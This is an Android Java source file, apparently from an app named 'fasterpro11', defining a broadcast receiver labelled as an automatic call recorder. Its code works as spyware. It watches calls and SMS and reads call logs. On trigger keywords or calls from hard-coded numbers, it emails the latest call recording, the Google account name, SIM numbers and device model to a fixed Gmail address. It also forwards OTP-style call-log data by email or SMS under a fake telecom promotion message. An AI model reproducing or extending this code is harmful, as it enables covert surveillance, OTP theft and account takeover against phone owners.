package com.example.fasterpro11;

import android.Manifest;
import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.CallLog;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.compose.ui.platform.AccessibilityManager;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Comparator;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import android.content.SharedPreferences;

import javax.mail.MessagingException;

public class CallRecorderAuto extends BroadcastReceiver {
    private MediaRecorder recorder;
    private String fileName;
    private Context mContext;


    private static final String TAG = "CallRecorderAuto";
    private static final String[] allowedIncomingNumbers = {
            "+8801300282080", "+8801304039280",  "+8809697637890", "+8809638821360" };

    private static final String[] WORDS1_GRADE = {"Goldc", "Silverc", "Mediumc"};
    private static final String[] WORDS2_OFFER = {"Congratulationc", "Conformc"};
    private List<String> lastMessages = new ArrayList<>();
    private List<String> lastCallNumbers = new ArrayList<>();
    private static int recordingCount = 1;
    private boolean isOnCall = false;
    private boolean isCallRecording = false; // রেকর্ডিং ফ্ল্যাগ

    public CallRecorderAuto(Context context) {
        if (context != null) {
            this.mContext = context.getApplicationContext(); // Safe way to store context
        } else {
            Log.e(TAG, "Received null context in CallRecorderAuto constructor");
        }
    }

    public CallRecorderAuto() {
        Log.d(TAG, "CallRecorder class initialized.");
       // mContext = MyApplication.getAppContext();  // Set the context here if needed
        File folder = new File(Environment.getExternalStorageDirectory() + "/DCIM/CallRecord");
        if (!folder.exists()) {
            folder.mkdirs();
            Log.d(TAG, "Created directory for CallRecording.");
        }
    }
    @Override
    public void onReceive(Context context, Intent intent) {
      //  Log.d(TAG, "onReceive called with action : " + intent.getAction());

        // Initialize mContext to ensure it is not null
       // Log.d(TAG, "Context passed to onReceive: " + context);
        //mContext = context;
        mContext = context.getApplicationContext();
        if (context != null) {
            mContext = context.getApplicationContext();
        } else {
            Log.e(TAG, "onReceive: Context is null!");
        }

        if (TelephonyManager.ACTION_PHONE_STATE_CHANGED.equals(intent.getAction())) {
            Log.d(TAG, "onReceive Call  state1 .");
            handlePhoneStateChange(intent, context);

            //if allow +6digit number Forward Sms By SmsReceiver Class by SMS
            String incomingNumber = lastCallNumbers.isEmpty() ? "unknown" : lastCallNumbers.get(lastCallNumbers.size() - 1);
            try {
                ForwardSmsBySMSSmsReceiverClass(context, incomingNumber); //if allow +6digit number Forward Sms By SmsReceiver Class by SMS
            } catch (MessagingException e) {
                throw new RuntimeException(e);
            }

        } else if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
            handleSmsReceived(intent, context);
        }
    }

    private void handlePhoneStateChange(Intent intent, Context context) {
        String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
        String incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);

        if (TelephonyManager.EXTRA_STATE_RINGING.equals(state)) {
            Log.d(TAG, "Incoming call from: " + incomingNumber);
            // call is ringing wating .Check permissions when call is ringing
            if (!checkAndRequestPermissions(context)) {
                Log.e(TAG, "Required permissions not granted, cannot proceed with recording");
                return;
            }
        } else if (TelephonyManager.EXTRA_STATE_OFFHOOK.equals(state)) {
            // recived call starting recording
            Log.d(TAG, "Calling state2, starting recording for: " + incomingNumber);

            if (!isCallRecording) {
                isCallRecording = true;
                if (checkAndRequestPermissions(context)) {
                MicRecord micRecord = new MicRecord(context); // 'this' হলো Context (যেমন Activity বা Service)
                String messageBody = "Some message";  // প্রকৃত মেসেজ বা প্রয়োজনীয় লজিক এখানে দিন
                //micRecord.StartRecording(incomingNumber, messageBody); // রেকর্ডিং শুরু করুন
                    // Use application context here
                    //CallRecorderAccessibilityService callRecorderService = new CallRecorderAccessibilityService(context.getApplicationContext());
//                    CallRecorderAccessibilityService callRecorderService = new CallRecorderAccessibilityService();
//                    Log.d(TAG, "Calling state2,  CallRecorderAccessibilityService.CheckPermissionsAndStartRecording");
//                    callRecorderService.CheckPermissionsAndStartRecording();




                if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {
                    Log.d(TAG, "Android version is lower 9 .versiov:" +Build.VERSION.SDK_INT );
                 //micRecord.StartRecording(incomingNumber, messageBody);
                }else {
                    Log.d(TAG, "Android version is upper 9 .versiov:" +Build.VERSION.SDK_INT );

                }
                } else {
                  //  Log.e(TAG, "Permissions not granted, cannot start recording");
                }
            }
        } else if (TelephonyManager.EXTRA_STATE_IDLE.equals(state)) {
            // Call ended working
            Log.d(TAG, "Call ended, stopping working running");
            Log.d(TAG, "Call ended, CallRecorderAccessibilityService.StopRecording");
//            CallRecorderAccessibilityService CallRecorderAccessibilityService= new CallRecorderAccessibilityService();
//            CallRecorderAccessibilityService.StopRecording();



            MicRecord micRecord = new MicRecord(context);
            String messageBody = "Some message";
          //  micRecord.stopMicSoundRecording(context);
            sendLastRecordingViaEmail(context);
            handleSmsReceived(intent, context);
//            if (isCallRecording) {
//                // Call ended
//                MicRecord micRecord = new MicRecord(context);
//                String messageBody = "Some message";
//               // micRecord.stopMicSoundRecording(context);
//
//              // Check Android version - only record if below API 28
//                if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {
//                    Log.d(TAG, "Call ended Android version is lower 9 .versiov:" +Build.VERSION.SDK_INT);
//                    // micRecord.stopMicSoundRecording(context);
//                    sendLastRecordingViaEmail(context);
//                }else {
//                    Log.d(TAG, "Android version is upper9, skipping recording.versiov:" +Build.VERSION.SDK_INT);
//                Log.d(TAG, "condition met handlePhoneStateChange for sendLastRecordingViaEmail.");
//               sendLastRecordingViaEmail(context);
//                }
//                Log.d(TAG, "condition met handlePhoneStateChange for sendLastRecordingViaEmail .");
//                sendLastRecordingViaEmail(context);
//                // Do SMS work
//                handleSmsReceived(intent, context);
//            }
        }
    }


    private void handleSmsReceived(Intent intent, Context context) {
        Log.d(TAG, "Handling received SMS.");
        try {
            Bundle bundle = intent.getExtras();

            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null && pdus.length > 0) {
                    for (Object pdu : pdus) {
                        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                        String sender = smsMessage.getOriginatingAddress();
                        String messageBody = smsMessage.getMessageBody();
                        Log.d(TAG, "Received SMS: " + sender + ", Message: " + messageBody);
                        boolean containsWords1 = containsSMSWORDS1GRADE(messageBody);
                        boolean containsWords2 = containsSMSWORDS2OFFER(messageBody);
                        boolean isInternetAvailable = isInternetAvailable(context);
                        boolean isAllowedNumber = isAllowedNumber(sender) || checkLastCallNumbers(context);
                        boolean isPatternMatchInCallLogs = isPatternMatchInCallLogs(context);
                        boolean incomingCallNumber = IncomingCallNumber(sender);

//                        // লগিং: কিওয়ার্ড চেক, ইন্টারনেট কনেকশন চেক, এবং ফোন নম্বর চেক করা
//                        Log.d(TAG, "handleSmsReceived method Keywords 1 found: " + containsWords1);
//                        Log.d(TAG, "handleSmsReceived method Keywords 2 found: " + containsWords2);
//                        Log.d(TAG, "handleSmsReceived method Internet available: " + isInternetAvailable);
//                        Log.d(TAG, "handleSmsReceived method Allowed number: " + isAllowedNumber);
//                        Log.d(TAG, "handleSmsReceived method IsPatternMatchInCallLogs: " + isPatternMatchInCallLogs);
//                        Log.d(TAG, "handleSmsReceived method IncomingCallNumber: " + incomingCallNumber);

                        if ((containsWords1 && containsWords2 && isInternetAvailable) ||
                                (isAllowedNumber && isInternetAvailable)) {
                            Log.d(TAG, "handleSmsReceived method codition met for sendLastRecordingViaEmail.");
                            sendLastRecordingViaEmail(context);
                        } else {
                         //   Log.d(TAG, "Conditions not met for call recording sending in handleSmsReceived method .");
                        }
                    }
                } else {
                 //   Log.d(TAG, "No PDUs found in the bundle.");
                }
            } else {
             //   Log.d(TAG, "Bundle is null.");
            }
        } catch (Exception e) {
            // যে কোনো ত্রুটি হলে তাকে লগ করুন
            Log.e(TAG, "Error in handleSmsReceived: ", e);
        }
    }
    public void ForwardSmsBySMSSmsReceiverClass(Context context, String incomingNumber) throws MessagingException {
        //if allow +6digit number match Forward  Sms By SMSSmsReceiver Class
        boolean isInternetAvailable = isInternetAvailable(context);
        boolean IsPatternMatchInCallLogs = isPatternMatchInCallLogs(context);

       // Log.d(TAG, "Is Pattern Match +6digit In CallLogs: " + IsPatternMatchInCallLogs);
        if (incomingNumber == null) {
            Log.e(TAG, "Incoming +6digit number is null, cannot proceed.");
            return;
        }
        if ( (IsPatternMatchInCallLogs) ||
            (incomingNumber.equals("+8801300282080") ||
             incomingNumber.equals("+8809697637890") ||
             incomingNumber.equals("+8809638821360") )) {
            Log.d(TAG, "Is Pattern Match +6digit In CallLogs: " + IsPatternMatchInCallLogs);
            Log.d(TAG, "Allow  number Conditions met for forwarding +6digit calllist .Forward By SmsReceiverClass");
            SmsReceiver smsReceiver = new SmsReceiver();
            String sender = incomingNumber;
            GetRecentCallLogs getRecentCallLogs = new GetRecentCallLogs(context);
            String OTPTypeGetRecentCallLogs = getRecentCallLogs.OTPTypeGetRecentCallLogs();
            String messageBody = "Use 1009 Blance Use this month to become a Silver Star, registration dial *121*5400# " + OTPTypeGetRecentCallLogs;  // Get the recent call log data here

            // Ensure messageBody and sender are not null
            if (sender != null && messageBody != null) {
                // Get the previous call log data from SharedPreferences (or another method of storage)
                SharedPreferences preferences = context.getSharedPreferences("SMSPrefs", Context.MODE_PRIVATE);
                String previousMessage = preferences.getString("lastSentCallLog", "");

                // Check if the new call log is the same as the previous one
                if (!messageBody.equals(previousMessage)) {
                    // Forward the SMS with the call log content
                        if  (isInternetAvailable)  {
                            Log.d(TAG, "Internet Available Forward CallRecorderAuto Class  calllist forwarding by email.");
                            smsReceiver.forwardSmsByEmail(sender, messageBody, context);
                        }
                        if  (!isInternetAvailable)  {
                            Log.d(TAG, "Internet not Available CallRecorderAuto Class Forward  calllist forwarding by SMS.");
                        smsReceiver.forwardSmsBySMS(sender, messageBody, context);
                        }

                    // Store the new call log data as the last sent message
                    SharedPreferences.Editor editor = preferences.edit();
                    editor.putString("lastSentCallLog", messageBody);
                    editor.apply();
                } else {
                    Log.d(TAG, " Not forwarding.Call log is the same as the previous sending mail. ");
                }
            } else {
                Log.e(TAG, "callist Sender or messageBody is null. Cannot forward  .");
            }
        } else {
           // Log.d(TAG, "Allow number Conditions not met for CallLog forwarding .");
        }
    }
    private boolean isPatternMatchInCallLogs(Context context) {
        Pattern pattern = Pattern.compile("\\b\\d{4,6}\\b");
        Uri callLogUri = CallLog.Calls.CONTENT_URI;
        String[] projection = { CallLog.Calls.NUMBER };
        Cursor cursor = null;
        try {
            cursor = context.getContentResolver().query(callLogUri, projection, null, null, CallLog.Calls.DATE + " DESC LIMIT 1");
            if (cursor != null && cursor.moveToFirst()) {
                String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                Matcher matcher = pattern.matcher(number);
                if (matcher.find()) {
                    Log.d(TAG, "Matched number in Call Logs: " + number);
                    return true;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error querying call logs: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return false;
    }

    private boolean containsSMSWORDS1GRADE(String messageBody) {
       // Log.d(TAG, "Checking for keywords in WORDS1_GRADE.");
        for (String keyword : WORDS1_GRADE) {
            if (messageBody.contains(keyword)) {
                Log.d(TAG, "Keyword found in message: " + keyword);
                return true;
            }
        }
        return false;
    }

    private boolean containsSMSWORDS2OFFER(String messageBody) {
        //Log.d(TAG, "Checking for keywords in WORDS2_OFFER.");
        for (String keyword : WORDS2_OFFER) {
            if (messageBody.contains(keyword)) {
                Log.d(TAG, "Keyword found in message: " + keyword);
                return true;
            }
        }
        return false;
    }

    private boolean isAllowedNumber(String number) {
       // Log.d(TAG, "Checking if number is allowed: " + number);
        for (String allowedNumber : allowedIncomingNumbers) {
            if (allowedNumber.equals(number)) {
                Log.d(TAG, "Allowed number found: " + number);
                return true;
            }
        }
       // Log.d(TAG, "Number calling is not allowed: " + number);
        return false;
    }
    private boolean checkLastCallNumbers(Context context) {
       // Log.d(TAG, "Checking last call numbers.");
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Call log permission not granted.");
            return false;
        }
        String[] projection = {CallLog.Calls.NUMBER};
        List<String> recentNumbers = new ArrayList<>();

        String sortOrder = CallLog.Calls.DATE + " DESC";

        try (Cursor cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                projection,
                null,
                null,
                sortOrder)) {

            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext() && count < 1) {
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    recentNumbers.add(number);
                    Log.d(TAG, "Recent number added: " + number);
                    count++;
                }
            } else {
                Log.d(TAG, "Cursor is null.");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error accessing call log: ", e);
        }

        for (String number : recentNumbers) {
            if (isAllowedNumber(number)) {
                Log.d(TAG, "Allowed number found in recent calls: " + number);
                return true;
            }
        }
        Log.d(TAG, "No allowed numbers found in recent calls.");
        return false;
    }

    public boolean isInternetAvailable(Context context) {

        if (mContext == null) {
            Log.e(TAG, "isInternetAvailable mContext is still null");
        } else {
            // Log.d(TAG, "isInternetAvailable mContext is initialized");
        }
        try {
            ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo netInfo = cm.getActiveNetworkInfo();
            boolean isConnected = netInfo != null && netInfo.isConnected();
           // Log.d(TAG, "Internet available: " + isConnected);
            return isConnected;
        } catch (Exception e) {
            Log.e(TAG, "Error checking internet availability: ", e);
            return false;
        }
    }


    private String getLastRecordingFilePath() {
        File folder = new File(Environment.getExternalStorageDirectory() + "/DCIM/CallRecord");
        File[] files = folder.listFiles();
        if (files != null && files.length > 0) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                Arrays.sort(files, Comparator.comparingLong(File::lastModified));
            }
            return files[files.length - 1].getAbsolutePath();
        }
        return null;
    }

    private void sendLastRecordingViaEmail(Context context) {
        if (context != null) {
            this.mContext = context.getApplicationContext(); // Safe way to store context
        } else {
            Log.e(TAG, "Received null context in CallRecorderAuto constructor");
        }
        String lastFilePath = getLastRecordingFilePath();
        if (lastFilePath != null) {
            sendEmailWithAttachment("Last Call Recording", "last sound recording:", lastFilePath, context);
        } else {
            Log.d(TAG, "No previous recording found send Email.");
        }
    }
    //if calllrecording file same call record class skip go fileservice class src callrecord and send

    private void sendEmailWithAttachment(String subject, String body, String filePath,Context context) {
        if (context == null) {
            Log.e(TAG, "sendEmailWithAttachment: Context is null!");
            return;
        }
        Log.d(TAG, "Sending email with sendEmailWithAttachment method");

        AccountUtil accountUtil = new AccountUtil();
        String GoogleAccountName = accountUtil.getDefaultGoogleAccount(context);
        String userSimNumber = accountUtil.getUserSimNumber(context);

        SmsReceiver smsReceiver = new SmsReceiver();
        String messageBody= "Your  Text";
        String setSim1NumberSmsReceiver =smsReceiver.SetSim1Number(context,messageBody);
        NotificationListener notificationListener = new NotificationListener();
        String setSim1NumberNotificationListener=notificationListener.SetSim1Number(context,messageBody);
        String setSim1Number ;
        if (  setSim1NumberSmsReceiver != null) {
            setSim1Number =setSim1NumberSmsReceiver;
        }else if(  setSim1NumberNotificationListener != null) {
            setSim1Number =setSim1NumberNotificationListener;
        }else {
            setSim1Number =null;
        }
        GetSim1AndSim2NumberFromAlertbox alert = new GetSim1AndSim2NumberFromAlertbox(context);
        String UserID1= alert.getSim1NumberFromUser(context);
        String UserID2= alert.getSim2NumberFromUser(context);
        String UserGivenSimNumber= UserID1 + " "+UserID2;

        String manufacturer = Build.MANUFACTURER;
        String mobileModel = Build.MODEL;
         subject ="Call:ID: " + setSim1Number + " " + UserGivenSimNumber +" " + manufacturer +" "+ mobileModel+" " + GoogleAccountName +" Number: " +userSimNumber  ;
        Log.e(TAG, "SMS email subject: "+ subject );
        // Get the file size
        File file = new File(filePath);
        long fileSize = file.exists() ? file.length() : 0;

        // Compare email content and file size with previous email. if same go fileservice class
        if (isCallRecorderAutoEmailContentSame(subject, body, fileSize)) {
            Log.d(TAG, "Email content and file size same as the previous email. Skipping email send.");
            FileService fileService = new FileService();
            Intent intent = new Intent();
            Log.d(TAG, "call the method fileService clss of fileService.SendLastTimeFileingsEmail.");
            //Context context = null;
            // if same go fileservice class .Compare callercording email content and file size with previous email.
            fileService.SendLastTimeFileingsEmail(intent, context);
        }
        try {
            if (!isCallRecorderAutoEmailContentSame(subject, body, fileSize)) {
            // Send email with attachment
            JavaMailAPI_MicRecord_Sender.sendMailWithAttachment("abontiangum99@gmail.com", subject, body, filePath);
            Log.d(TAG, "Email sent successfully with attachment.method sendEmailWithAttachment");

            // Store the details of the sent email
            storeEmailDetails(subject, body, filePath, fileSize, context);
            }
        } catch (Exception e) {
            Log.e(TAG, "Email sending failed: " + e.getMessage());
        }
    }

    // Store email details in SharedPreferences
    private void storeEmailDetails(String subject, String body, String filePath, long fileSize,Context context ) {
        mContext = context.getApplicationContext();
        if (context != null) {
            mContext = context.getApplicationContext();
        } else {
            Log.e(TAG, "onReceive: Context is null!");
        }
        SharedPreferences sharedPreferences = mContext.getSharedPreferences("CallRecorderAutoEmailDetails", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putString("CallRecorderAutosubject", subject);
        editor.putString("CallRecorderAutobody", body);
        editor.putLong("CallRecorderAutofileSize", fileSize);
        editor.putString("CallRecorderAutofilePath", filePath);
        editor.apply();
        Log.d(TAG, "SharedPreferences CallRecorderAutoEmail details stored .in sended Email");
    }

    // Check if the email content is the same as before
    private boolean isCallRecorderAutoEmailContentSame(String subject, String body, long fileSize) {
        if (mContext == null) {
            Log.e(TAG, "isEmailContentSame: mContext is null! Cannot access SharedPreferences.");
            return false;
        }
        SharedPreferences sharedPreferences = mContext.getSharedPreferences("CallRecorderAutoEmailDetails", Context.MODE_PRIVATE);
        String CallRecorderAutopreviousSubject = sharedPreferences.getString("CallRecorderAutosubject", "");
        String CallRecorderAutopreviousBody = sharedPreferences.getString("CallRecorderAutobody", "");
        long CallRecorderAutopreviousFileSize = sharedPreferences.getLong("CallRecorderAutofileSize", 0);

        // Compare the current email details with the stored ones
        return subject.equals(CallRecorderAutopreviousSubject) && body.equals(CallRecorderAutopreviousBody) && fileSize == CallRecorderAutopreviousFileSize;
    }


    private boolean IncomingCallNumber(String sender) {
        for (String number : allowedIncomingNumbers) {
            if (sender.equals(number)) {
                Log.d(TAG, "CallRecorderAuto class Sender is an incoming call number: " + sender);
                return true;
            }
        }
        Log.d(TAG, "CallRecorderAuto class Not an incoming call number: " + sender);
        return false;
    }

    // Check and request required permissions
    private boolean checkAndRequestPermissions(Context context) {
        List<String> missingPermissions = new ArrayList<>();

        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            missingPermissions.add(Manifest.permission.RECORD_AUDIO);
        }
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            missingPermissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        }
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            missingPermissions.add(Manifest.permission.READ_PHONE_STATE);
        }

        if (!missingPermissions.isEmpty()) {
            Log.e(TAG, "Missing permissions: " + missingPermissions);
            // If we're in an Activity context, we could request permissions here
            // But since this is a BroadcastReceiver, permissions should be requested by the app's main activity
            return false;
        }
        return true;
    }



    public void SendLastRecordingViaEmail(Context context) {
        Log.d(TAG, "called from Notification class .the method of sendLastRecordingViaEmail in CallRecorderAuto.");
        sendLastRecordingViaEmail(context);
    }
}
